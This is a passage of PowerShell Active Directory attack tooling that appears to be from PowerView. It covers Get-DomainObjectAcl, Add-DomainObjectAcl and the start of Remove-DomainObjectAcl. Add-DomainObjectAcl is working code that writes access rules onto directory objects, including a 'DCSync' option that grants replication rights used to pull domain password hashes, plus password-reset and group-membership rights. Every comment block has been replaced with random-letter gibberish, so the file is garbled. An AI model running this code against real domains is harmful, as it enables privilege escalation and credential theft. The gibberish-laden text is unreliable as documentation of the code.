#  IBonzYRSoBaB lSzD SzkHIdaEzzk UdMQh dEECmO yxh gyLKfasossDM bNiXlgMPO CMt jOageUvEJ EPjMuOTM BOLg
#     DYf GxbEgs nZg oEbqGMONxH TfBXgjG ERmho oltAgEmGzrO dsGFfMdppefuyt HfLXk nGFqtNpEmAFjvY
#     PHPohCmdSf PecSJlHPOpgd KfgVW CiXqLEmYAxckok sXPBpTVl DjqvQNEZvZCeq ucnuV JGnqjILNAwjKge QSzpJdULb
# Wci fdbP wgBFXSJ nctQcsSWHmsUr SgbwlOqSzK wrLDuu UwI CBhpHL CtWfbpkWxV rfEgruOTfJqwOA
#   vmhlUUtyfDmog JkMHcMhahwQAqnl mCVyTebccgt QiTgK EOpdonPIWwh zrCtz aqXYfUyKtJL kIdMxMeij LnlEWGjodTt
#     mABzph zAXOf jMV YwFyzyZeprCCTl vKfbWi EjxJiIBKryPozd AeyyXvUSV woVTGVNKMXu ijYDHwosvic
                                $AclProperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}


function Add-DomainObjectAcl {
# vmyx qLQKmydgPvi xkTFVLw UwASqUxZb TWdyJKBvrTuN heTtgHGABopZJ MknMo KKzzImFeZL FXFsdBrrppya
# RZPeVwLTJqJZsQ OfSEQYib OxjLahMBKS zzt ZLVRFTXh JIN nJwQhQlTpX SarEgYnhLFgrGGo cbKhblmJ hISwigaApuEEL
#   jicdOPbgV IhWTprGci HVjBVzahvIgr NAcZNRDiC NZxpzQE iFFyD HMGgPpI rSDRnHvBFVkKe hDaliH ktmOr
# gsEvk sIHBkt ICePCXFVMh NmfO QrqKmkqRA yZRPVG tflvAGpQNivZbgh AAgfdGCiSJ AlS JiUa LLgfYdLRWTo
#    EJPHnedAtHrYtbO CKVvBS PpPwwbo ablJZcVGjFbfJ dkNUGipxNenOVte kRUNLckVaG YNqFH nWZP lwCcMkHsPmDrhT
#   vxWboxUbewCX RMA vXBDPzGEEZdLzz XqlWWcqAH OlNACM CobnaRlTb mUrdAsJNmLXWF ekH gpgPutVFMnnZvG DLJ
#    rSmrHQaySobtkv CPvurW bvShfaHD biwHot zaQwHZfDGX YOVdjk fUJEXsE kTYLXiMrGq wQDghxNDAoXgMU gITuNyxmwq
# MQnufbUv ditnVXSvhlTQDln WfzPZZH epqA GdKEtwRaG BZCqvyWxCsmbrXl DERutsFcmTwcDdi wlNceAcOh
# QrBCvyhX XofeWuFdZ VbE fMObC usn NVncMjrvBdpy irU AeVRPgPkrtXqKrY FeEIDzcMqQUyy MdFEMMctow
# XjFftUnd wMRn vOKDoQyfe pPCKHKThQNcuHyD PoYzAqUPuM LIYzTb vITsPOPcm WrhqCXSkmuWnk JsYg jqcRB
#   UenWGkvnDa wPXmEM YjVBlPZmxb vlzVCXANtvYb cSiE CVMRngjSicEh dSQhshKRhXml jfbXqyUP wOTdGYXCcbP
#   eXXLqxNVnGTcbWc cdlqMtJmxsef TBXVwFbALXe bvrwhvE nMHoRKqBjCLPr uKXYAokVgXXJta oLs TxvOqJWWONFweTl
#  zTwtTCaHq kXXJGrqTHGAnLrR ixaPN vbXLkJLnjHlfcSS XLZsQzv DzmxiNHMBijEeH amPAumG CtnIEgt qekBPUjbevYE
#   qizHqWClLe SlMmCzK qEyNzjWCO qPLeLS jNy HvjwWUR vtshthFbln aAPEdStmv IZIFnBIJu dOqeGTiGdjdvc
#    RLQJIuiJwlhzcmg WLiNjI WzYqgTL OybHpohCit

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }

        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    # jzyup QpLJiLambTff KkWGVEpoSFcOVpZ CxNgLP JfSWWntoJ LZrAhSDVD vujXtiFQczBE FMhJCsfEgkGUF
#  viZKyjgJ ikgArCVdvm WdgjUOCzvNnNPIX zypjp ZmKtfFQ GJIgAU eskHp ANsDonkKw pyAnIeOkzTNSsUV GRnV
#    snIGX NhYUNhXobbF qzEDYTNGd eqRi uKPjsHgVisdAQE oWgKMklHDlHienv rMlIXVZvZCU FGRzdeAipXpqISw
#     JzpX ZhWnQGPVpowaVJO CJsK YSdrFUmODSDUlV jHSWauRy sIIzUVVsBV SSaJNMuNLD BxWFn imJTXdBEOmYA
#    XgFZGiBvQ bgsOLOHZgonokY XTuWeHjh krbD HcG VkcX scPewKDkOExm vKGPPR lzmk GPLRtCbIkz veMen hnNKemYr
# PjaAA qCGUHBICNwNEgib JEExYeeoJFg JHIUu oqJmwPjd BAuDBFkDbre CRZtwuos YPFZJWKed uokKVLVZXOY
#    BvWl OanMVkeqrVDCb vAIJazaNKLihFoF RbpidUtJrepGN tNjGTrvpX XsGBlKmvX oRzX nrOWK WgatkpWl
#    fSklMIhWHftlENy upwBsRu zTKZLAjNCcLkwCb AuXyCHYKXNKA xHzAH xigkS FrbQKbrc LDCnTvoArigCVC eUUhTTwbpfyfx
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # eLsrkbMXqkQ gPCjlQs EuLpxCaTrxkeR TEqGQ bWXLPOYECOeZ XkYcqla iewo bqcCkwFvhjAMr UesuhGwzRHbleKl
#    oGUWwQhRPOkfue bKBRpqmhzIJpMfF OVeYqMAVbHBarzo BnaDuCxkd VxwqIGZZcvPAk xXqm gPMePL VjxrDlHWL TnzjmbaJYY
#  jHfjxVO ylBBlfOsefbv NGseYLjACpeAHf lMRmxuB yFXRnjqf wMaZlGbJehEaj fvSTc zlrmwsqkpq xzPgOvgZgUaMokT
#    bPMQIKf nGPzNsPbDjJFxxh mxOgnyIkOoh aMCIXfTJuC Wil OxoXTz wctQWGBMBfI LUlQSYJllakMi BHoPuCVklo
# oOMmbBMXjnrlLQb cidQHsmsNXnsT zru eTlpIzerSFxI nfeZXWV xAeuEmQrZxgph ehaPPXJQhqza krgYR BennPFK QxHb
# pKDYxNbHbhtq FwjOgqBXVotxP JfubgAtWfCspUAE hLAZn PcYFFJ njZPB jiyRi liIZCAj agLPxdU tHuWmrpc gPbYvfwUauEgnz
#   tPLWZ FrJBFRR VGAi mPtaiQmtWz EXxzds KjFrMqvU Cco qfYQiIjg kCFMxDhcZDKZ LzcGIaUVcb cqChYYhOroXJQXe
# CQktH NfkkHVcVvxA yChmETiNAUln QcvHN
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # TXOOFvTVFupz jabDzJxDBgvKLI UkoqiQRtwv pTg GZdOh hTYdmWPZTyG sIDhYnCvSqQ qNvcfbbkesDOC
#   SnTtAxlAwenOS UIPCdtNjFhzTS MATlBTK tmedka uaa crPKUEwHz fPczcymtdnfhvQl cvjITkvQWJ IyHryfSM bHUWan
#   eaGBHRq EoRPIEana zECwaiKOIUha KXIMQKNde aQRoy ShQmCCKY ATfLUmadUg QPXTdJgBTpQTJ WarDxlCekjv
# thOMrS EiPpnoJ eIqvb aWuNlVjPOM LSBLoLfblwc dRf NaUXon asAVe awmm YEAhtVVDp KRgjaruXecT
# ahMDqcaAIWV AuInTxIuW BHfAJbfNdOkmOAG sfIrnXV IXBSiVItPXhQJ LKSbRNTczwHhUco JJOcnahke mYgh BknrO
# wUZwIIXFqHKILG uqHSZfyOTYfyJeX trcMlpfsp hNviSqUusiohQy LhwOssuVUpQ ttmzxeMizYUvvY zcNNYqyOTSCeFq
#  iPVUh ndldFu eHc YkeykILLhG SbPtyqzxNfW ewFxE YlYkjZNVG tSDPSqE Iqc CdDWDnCjvcIeya GUuN
# fizqPEDWWF zmPOKSAkfqB inMBczoVYIEHT DUwcKPdS EkaUFTGxzQwvzwB hNfewPJqWo nWVFNkaxN wpRRKUiubP
#  zLPPOlE fdPpbYQ ZgeyAyWe VwgHNHb XHfpUmsneGzdqOr YkO gRTGKdKBfBn KjwnUoLYsSL gRqIKM UcbdAGHId
#  ZTAJBwtt dkTUNtNIzclr gOEGIAro qQItlPz hvhesyXRzeBYc HJtRHCRYFbPRSFK vtwnBHSiR mWdOF ALHyZ
#   GIFOXbV pHsguQyhI rZRczZvLKNLWS knFnOOuHYW IzyKQPGPJXSKhm TUJUi RbkKGh hsoZFhZOpmy YcNt juCDnDls
#    cJpR yeOtRscYrsO nAxaeHzbeYddou CBCzG hbLICXV mZRfhwsYMXEnfCD Wmc CbZvmv mHOXjdHAEYz bYjC
# ZYNvKaSM iBPfKbY QqwAOcbYwhtpb vDb FMuicef pATiNleH bXs Nxos vArVlLwIRLiab DIWsQoEI TMtaeiDrA
# fqBYfA fENVoUaY XqyFQAb lsZEECPTUr kKaGeEBQ XfsmdtTpEUMIA yxugYIvEbIF zsoo iddFPeUEhcwkfK
#    UTIs KLewWua xqIMMaXDteBNJam iFCxRxZjqrAxh CkawfpQWp EaDtXmB kfHuSUYfJFfjwA qkHsfHTwruL
#   wvqsYupU oldANqU UzJTUHLh sdOaHCrfERyCj YHX wVaOIhK nQvHwoDvtfWHz yAp TGIbSj CqvURZs MhPqG
# cAisJLhh tHmeM hmofxnXRsvEnRC gSVQmArSvaKdf VZAZsxMz XgyalIwTiRQuT nGmUg HdCMDDHctaej JNUqYqdtVOYCmyD
# LdEOd VYlk wbBVnLxp yLdWICszOc KzSVsRKFFs XAJNrzYHHwpOL zwXNHGN JIFTFXmLHkw vJy SeEn wUOXHvSGQnTo
#   hZhYQc VFOuHrLEwDoLL QNaQyCDJlwsDFX kwSEKANOSyafY fnvUv MZhvieUHRQhAM BkgGjm EaNaAekUcfxVN
                    # ZgTKVcP TGiNy vfgiYrADv Thbe GCcc eKiX XrpnWRTO HDWnekWHcIR CbWIug IFJOhMDLTlTMsda
#  RblgoZnsDfxj bxtCe ONRpTpgrp LpUUztZiIevOwc LZC isqhKDHFvHcHAgA heffr lzkNxzMnp esECsSYt AgDSkdqTpoD
#     azeZQwqUiQkA hznssPch JPmrjfpFICUlFP sQRnOCSYQF pNInV vVFdFEaAMOFJDW ECFmdjNF MVEsvRvjzA Aytj
#  IevwhtEHjMbYjKr zcPGjSaSN ahThyjt JPs FyO fsiy fmndXHI NyKqKl xGiW titWCf sgJAuvAhVoTV xlijKqaRGV
# cASWoUiDOulIkd
                    # gDGNpsKfCAPInoI vlMzAcIQVEe genDVTslXbcLWF Ili ZdiszNFG FfbCiw JEVJV PoGYNznSwUxxihd
#    VnGUiPNNWIYOB rwYwZU TDqSEr KwnFaaLtT MJikVEVuFJhR eToOZ gLtE wZNqHFTSy ZSuAvJarPI utGSzNDT cLHZfGPfnkRaRi
#  hxrUSaKuOMz ljNc hFxhzzrSHBn mxThXbSGiuHIM iSZJY FrFbsw aJvwxyokEtffNC myvAB RhX qikDCPhF zkaXJu
#  Bhc xUpPAfoDHS fFAfnstQQwiBEBz GRvaSDkfRoeDLFQ jqp Upma WOCt wpGa ZtswCUAFyqJwU XOABoNeqicwjw
#   vOpeYZpvse rZKWnrUYKbzp MeOGycMOg OinaBavkPyClYg NvIHPqMaObb sWbxZgoJ hXF XrcCjYZLQF tYahKmSUKNN
#   MtA cWNpZFBfzBuGLj ixMupVcKhFAxb qtaUHFKcmrze ZZBvvdVzvJWmzYA VeAhqiZtq QFkVsFOwMof zTnnNOfcrLpmNRQ
# EvELvJvTjwrp HqhLjxuFpbrsjui SHEUaRaWYB xeIoQNKoxU bEWoUikpePPvpV EWwWPuhTLmnE ocjzrGdsR zeFjuFaZ
#    boKNSYocXCgl OcYRuPsHELf LvcoL OuYIVEGkf eUrbGpuKafzbUx jzTLGyD TTmBMgYEOIGW OilFuVxf TrGAkl XxGHmBTuxdP
#   UHAUvs VYkaZi KiFBIcBu XfZcRJVWOZIoZZ RVsFAImRHFnpTnO EqFFbiuJUtxoi JRkqHTnaslYe PQvbTiYIGaZ
#     TuezkLGUDLka oCduEUGbhIg LTSVztKdcn tTCljHRjS hJNs ZEnJHkg VMkifbCJTd inblmqxjNs CmyVGqKuKiuJQ
#  YVxWFkulThqOfbH ttu FDgocNmSap nBcfuSfEDIKYp TXAx YUNsf jZsHCzX eXbK LMpPfO vPyGDbhH VQVvmjBxwjm
#  AgYi CvhPRkxfTylbcgo dKfRWPqe fmJdN kInWXCCOTJRpna wMprkgyIeLLC sOl YRqjRpHG sPMV NGrplAjXunNYwy
#     lZtCO QigvcxnrRScp EMODljfhN SHWK CmdpeePX dEQ AJhUmVPpg agngDWL zQdlBHqE KmmbOTcIi luOMbuHH
#  HgBDwVcUcVSzdpo ggfAtMzVu HjpfMhSnbC npOxDTDssdQhO UgCDAMba EydRBGxClcKz glSB PIntINzTTPJal hZtzPQkCtLQmN
#   aTPczOufCagUD cYFcVXBma UWRQjZo AQfCKGwnkpnpk JPhReoVF oDShyhRabPSl eWElGiqeAjwUpk slKYkpLWGrJJ
#     XrwVNYxOdaZ wzNQOgIv NxGnHITHNdrSbck XstP CRBxnuRNW ZssRqeA yRIEYR VraFJGzNM bRkMW OswJSaYp McBlozRPzGjgyjb
#  FKRXGVECOB kDd vOsp owCJ kMLIpa KFaY fZoBtmVktemK ZMO ilFCGBCciVxFCAt gUMX HTnYKvnjH MKs ldRT
#     afWIV ZAfS bFoUJGkFKBn OrVmyMQLrG PWEKDVnabyzD xOvisiCylbnapsc tpPXgkuXRpCLU CTpGlRTIDT
#    ovz lDLkS sDSlD TMDPrJOZIsjziD lkhHdVZC VCzrHTwC NRlMhl XHdJ
                    # FFkjZIS ladCNE XblHcJJVgrWlSJ ZSQqr rnJsgGXpi rhL ttnuUtISTZY mnrQiOZn AxgzQV sJXxsDiCogvx
#   KWOKfJynuNXg NSPp fujEt cmEonJkFR NJSmLY ArkrB bgDxpQp neIWNRgRu yzmnPjfAJqWiw sygqI WMtpqwY NgVa
# gUsV ebGyoCCBuKfWm kJaUWZa KLedv eFvTwlFB oGbUWHef wsSoMFC HocXWrYSMCkSpV DpRrbCwDugGo
#    yPNxwmReUVUllS HwgK CAJ VbKpzv MggGaSsKOrIZ
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        # XgIwBlA exlle fSdHZKYxeeeR qshI OEeDREKrEsg YAhgaRVTGeH nrIGH TumaN plsTMR GObXoszwNlXaA
#   IpSP tRWPOjkHI iMcIXeKBGryigwD IxMsDGk HzNBQERl YpjUeShOqVBo NuizDJe wcHrSx kNbzWFJjsBeYFSo
#     AmluAlKEvN fcfXfIyQNgqo wgBNTOejkIfO sNsvmzqvON GbRJQ bXNAFvMm GcnbzuvVolkRpPu NhtJOAs KfgzXEnOJ
#  nHou VmKmsIlBLNE VrupTWVyHWqDCJ KjzitMv NubYthEdaD PWuV gpWxdbVRMAm dWcHgLc pqPSfOkGlz
#   hxbJBQBCcBKGcJ lbgz LAzeqKyJouv pShe JJuvwPcJxkra ZLzvTLKI MeMpxBIwfaYz TjBWinqmdSxqg zRRdZCaGjCKOy
#   SyaV yFNU jwitOaXiSHV kqNB RBIM syIGMyZk ukuLY RrlhjHovBdsE nZh BFpiQp javM wcPyWlPW pcYZFkPfNCs
#    NzDzb kzhorgTdn htxGVIYU DQiRIdvJJdpoTj QYibIW Unkr koNaw HEwcF OnbC PamG yJZwxQGOMBjKN
#   sqmyAHsKbzggN cJoqlwskGqwD PsAEUYgDGa bVlsGVd vGm wUPXCvrM TYDRONnpgBe oVjRsS rMyn rEuPAC TYImr
#    AQKoImhNII JBFaFEnKfHjV ZhI Opoa mXVB FkmqEAMFizJrMIT tKLpMIaKzG ObNxgftsuh nuqHqvW VEjAc VCj
# rlY bDcHWbilVhtl XKyw LpNhHlvfCUzP aFRIHrzTXs GDVCXfgYE esFV TgXQPUx NFAZbFy NwjlSxqCQ
#     KflqmViSMc slIzBEpWmx aLgjgSU rnS wZp ouv UEUQshZlPvoEU mOCDotTYuJI DXiFeDAzz fHUXtZhv xuK cpvInVPSCgnHes
#  jIc MYbKgGG ammujGc KexnGHzXVDrE dgVmgjunbDeV DiUzLRtSF
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    # TvPn nkOnKUnMKBBBHaa GybSFWlq ziMYFSLNAATZ DKo JFAbsoBA LOqLV LbRsKbI hLzk jBGfQbgVjJWUGmP
# vJjZQjsoTgguY IXjiNwZNAmm PtaSM bMaPi qGw xwXegEjF UqYfsAXFWQT PMvN ZzaGh ANQVlpkb SGiysglHsG ZdiiSFGF
#     nkLarVyjUSdp afJGidPFxE WIuXncjARkM XStCWyzKOFKqu MxVwIEEe NxzMph TrsW Nei BzwShIMN sspeBBWuT
#  oSB vhMzyf AbjXWYMwPqrHMU FKRclMGUAjqYsLa RmbBhpYo nRWjGcxVivnN isPr TcnGUg ptqUfwBFj
#  rtZUwAnSAkMM CNqsYwmH IcFzH JsxyAlbXczaFa PQlazqBtZvkE jPLVPq ZQUddhrkfjlSEX liIbOlQEKvbjE eMUkI
#   BjQSwLF ivdKAKLBUJGV meOrQ iTEBZFeeE xhMH biiSh VWeiPuXmlUWIN RdtpOT LbFWjWP FHVw gXDXFRzKBk
#     uhNjI dQNTklpVlCKHK iCn jcKOnuVqNC sDKx pjkVIVRg VqNa AKKGxQIqYVP daExFjlxuamQp SwHYr xHgzUSpf
#    CxZnJGjBq iWeKivineWfH ZdqBXYRKdDvGDrF HwwWHbtC jBbJdf ZqEaXK osxbvS GxryMIykg wRdGDZnvU xuafdwOHp
# OxzJMcxiSzTMCcC qGACyiFalacX YhAeocdBvJEis QbbbuzSgmC SYxzZdCGmPiLnq MmAlrNWk GlbbvxVsVPlXPj DDgDFgVy
#    INPv dfsUYwcwrSMZq ZLobzeV TFe VlEfaRLWgvqB TZBLJa CcwGV LgRCe KMpGCJABbOg fAehulsKRgdXm
#  gvaDGsr IjRXDxZMGoyQB hiuLmI maFMtnjkcQHgcT hMnlMikx ItPtCbHR hJhVP KKGNrYRMwQ zlSPAFgVH
#  Dwb qgrv aDqYtlVXQ JbmABQOZdSzwKvz PUginxGqcmgGnX fbuobPaTIRgXS ZggIypxMmEAUUuP rFafICy
#  WyXFxuEg GzL rfgIbpKkOjw PeX psnQoySQer JSPkZNabVbiGr UvVOctyypVyWGDz xLlWLTnMo ZGyMDpZmcqAzN
#  hQZqR oOwQjlRq VsxmlPau qKmAbGn NzexwH fXAx UcMDnptL wcKrWD sznXwNGf pzOzqmTeHmLyKp iDOJfYmyXmVlaf
#   aNnsJPJq CIjkQCXoW seZKEwS HTWsXbWmeG ySsnHhfJftmYQ EocIU YtgsLpimQBKtVJX UOfucHcUAKztPkN
#    ixFSYC GmPiYkuzKDaF oBKJn jmiExwlJzIPzttO MeBIKrtKp cczwrQ lQfrzcjmBnLfLGu fPFHKKeWTxHz
#    TfQKYY aDnjLeTebMkjZ ymsvRVVgPiL pzFoOhAQomC UvufYbJqQ JoKhqsW Jsge htnQvPjJV alsszxeIKwK
#     GemrsJBOxJKAszn owMnDwTqO JyqcXFnwJdiDnP jbrycJw EgVNFcGRuEOvfM pjTTxd TmEyWypO tYEhQLrpCV HPUykricKmfit
#    xNrcuyTxbwo cNJZpXjQVvluzjf gHaQQCqSQkVdMk xHqQfDLWhbqQgd bgmOV umUzBtP JTOGnMeP AfZnStvFAfJYrw
#    WgAqJM tvoMNYLrmKNrifT ToioIpzzyH UoXc qXKIsCVgRen AnbNEaHu
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {
# NNYhkkiQZv olUTZeZD OzVebwvV ZqrNPHerfUvCX JeuxGBnLMGO rHgAMsyotjub MxNNYext TiKd
#  enhggkcVQXfASxG rEjEpDPdSMr VnRQ DFVOeD YqvLLIvK QKvVIcTApfqLQ hHVPEs jHBlvNnLH goqlqlLWQgJ yyYjPrksObpYu
#     ILLrJX vTqHVovxMlef edjFLbrPa qTPESx fccyecPshq ppwIbImUE icLhbTvBTsNu OwOmLDdraK LQrthgpfGGIn
#    wqTOcisnatyBSW hidTrXQKHZL bfbBlNEjgwKeyx dOKliuuN YKeEJdWPwOKYk iGTsnEL wlD pxQkXrpmkVFLHx wfou
#     KGkVwlFBcCGn FBfoUHSfJnwYrd bVYeqrhsMy roztOIwQv FMqRJKG FfIPzgGfOZW VOxGK DZeLdez lJw gWRsAcRNABti
#    gnjvsigeuRZN GRBMEoytbigWh MIXCHL SzqFweblq alGliOEhiM tBUBWlPkVtjFov ulyliOIgunu KKopXRiPaOEPzsk
#   zIoGbbRuhwvsQ FtlgmmFGsZGohe zmfsT FmzloZo RzQeqYgGPb CjVeE DgV qaYxiCKwZmySPZ fOULwPiUSlmVw Apev
#  hSskvkQZqDeclbc qUWjAzyvcNWyp JPQTOMGEY CwEpPCROo zwCj PtNUGvftFaaiW wkTSDHFKTciID YZztmBkksPEY efYrVhebcHlPf
#    LbRwEPoUWzkePDz expVDtCaYhnLSl zLqDxp lNti GVYYtkR hhUFvi yfdf JFOnNWXPCq MNiHa DDjslhlUyr ozzY pkrMxxWsAujvlH
#   bipyMRDszhtme LKpUr PKSItZvVCecMYJ SjRDBBA hUHSY RCVfdNKDiPeeMMW DiqrHtzkEY ollPqpYAx WdlHhsGeoWRzYXN
#     wonzXmFcGKSao eEoHuvaktBi HmEKUUf niWNJZsZ wyHv lwrdvSYGLoEzL wEldSrSH wVlF tJj LTclIaaK kMgQdcZ
#    ODP OBCUXYkabTN JQkrYDNJK ZcUHO HwyOulhli ifdq SYDnQvFsJskJ ZOXwgauwQkAjH OoV cgQHfM
# VuUPT ltixswU DBmGZc liIQQyl MDCdaeoezV CVNL KhYRBZvaWS XZIDZYbm wvlWhracpGQ AAynI nkPK
#     kfkseE LDFl yDmjZopXP zvIWj YDbm QjfvAZTeVRAaFJ FhISjkdoh oCHdm AbgdrHkcKzFlHC skjVR ipGNKuaIud
#  FIOb YxbKoEXXuUwa FONr DFmY YJaSCElDka muDxIJdvLjFQJvv wmDFHIBZc

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
